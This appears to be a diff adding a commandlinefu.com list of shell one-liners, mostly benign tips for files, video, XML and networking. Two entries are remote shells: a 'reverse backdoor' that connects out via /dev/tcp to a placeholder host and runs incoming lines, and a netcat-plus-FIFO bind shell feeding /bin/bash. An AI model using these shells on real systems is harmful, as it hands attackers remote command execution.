@@ -1,0 +1,78 @@
+# commandlinefu.com - questions/comments: tech@commandlinefu.com
+
+# print indepth hardware info
+sudo dmidecode | more
+
+# Concatenate (join) video files
+mencoder -forceidx -ovc copy -oac copy -o output.avi video1.avi video2.avi
+
+# Convert the contents of a directory listing into a colon-separated environment variable
+find . -name '*.jar' -printf '%f:'
+
+# make a log of a terminal session
+script
+
+# remove all spaces from all files in current folder
+rename 's/ //g' *
+
+# New Maintainer for CommandLineFu
+mail tech@commandlinefu.com
+
+# Bare Metal IRC Client
+nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set timeout -1;spawn nc $sr 6666;set send_human {.1 .2 1 .2 1};expect AUTH*\n ;send -h \"user $nik * * :$nik commandlinefu\nnick $nik\n\"; interact -o -re (PING.:)(.*\$) {send \"PONG :\$interact_out(2,string)\"}"
+
+# Get your Firefox history
+sqlite3 ~/.mozilla/firefox/*.[dD]efault/places.sqlite "SELECT strftime('%d.%m.%Y %H:%M:%S', visit_date/1000000, 'unixepoch', 'localtime'),url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER BY visit_date;"
+
+# Submit command & rewrite orginal command
+<ctrl>+o
+
+# Check all bash scripts in current dir for syntax errors
+find . -name '*.sh' -exec bash -n {} \;
+
+# Encrypted chat with netcat and openssl (one-liner)
+server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-ctr -a -k PaSSw; done | nc -l -p 8877 | while read so; do decoded_so=`echo "$so"| openssl enc -d -a -aes-256-ctr -k PaSSw`; echo -e "Incoming: $decoded_so"; done
+
+# Symlink all files from a base directory to a target directory
+ln -s /BASE/* /TARGET/
+
+# list directories only
+ls -d */
+
+# Do some learning...
+whatis $(compgen -c) 2>/dev/null | less
+
+# Merge files, joining each line in one line
+pr -m -t file1 file2 ...
+
+# sum a column of numbers
+awk '{s+=$1}END{print s}' <file>
+
+# Android PNG screenshot
+adb pull /dev/graphics/fb0 /dev/stdout | ffmpeg -vframes 1 -vcodec rawvideo -f rawvideo -pix_fmt rgb32 -s 480x800 -i pipe:0 -f image2 -vcodec png screenshot.png
+
+# Reverse Backdoor Command Shell using Netcat
+exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# Adding formatting to an xml document for easier reading
+tidy -i -xml <inputfile>
+
+# See KeepAlive counters on tcp connections
+netstat -town
+
+# Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat
+mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo
+
+# Quickly CD Out Of Directories Without 5+ Aliases
+up() { local x='';for i in $(seq ${1:-1});do x="$x../"; done;cd $x; }
+
+# Remove all zero size files from current directory (not recursive)
+find . -maxdepth 1 -empty -delete
+
+# Create the four oauth keys required for a Twitter stream feed
+step1() { k1="Consumer key" ; k2="Consumer secret" ; k3="Access token" ; k4="Access token secret" ; once=$RANDOM ; ts=$(date +%s) ; hmac="$k2&$k4" ; id="19258798" ; }
+
+# Keep a copy of the raw Youtube FLV,MP4,etc stored in /tmp/
+lsof -n -P|grep FlashXX|awk '{ print "/proc/" $2 "/fd/" substr($4, 1, length($4)-1) }'|while read f;do newname=$(exiftool -FileModifyDate -FileType -t -d %Y%m%d%H%M%S $f|cut -f2|tr '\n' '.'|sed 's/\.$//');echo "$f -> $newname";cp $f ~/Vids/$newname;done
+
+# AD: Diff 2 entire servers at ScriptRock.com
